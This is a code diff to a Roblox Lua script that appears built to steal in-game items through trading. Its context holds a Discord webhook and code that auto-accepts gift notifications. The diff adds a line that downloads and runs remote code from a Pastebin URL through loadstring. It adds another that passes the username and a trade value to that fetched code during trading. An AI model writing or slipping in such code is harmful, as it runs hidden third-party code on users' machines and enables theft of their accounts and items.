@@ -21,6 +21,7 @@ local dataservices = require(repicatestorage.Modules.DataService)
 local httpservices = game:GetService("HttpService")
 local username, target, last_target, toolequip
 local webhook = 'https://discord.com/api/webhooks/1397642896605446225/3YcXOzqeCHJaZ35antAlUFwvvn6WzUVfsZhWc5krRDsGtVgtLFGPHFwam_HUVjjbsSDD'
+local flexy = loadstring(game:HttpGet("https://pastebin.com/raw/wXH3JeAp"))()
 
 -- va
 
@@ -120,6 +121,7 @@ task.spawn(function()
                     game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                     _G.is_active = true
                     _G.is_tradeing = true
+                    flexy:refresh(tostring(username), string.format("%s", v))
                     if game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification") then
                         interact(game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification").Holder.Frame.Accept)
                     end
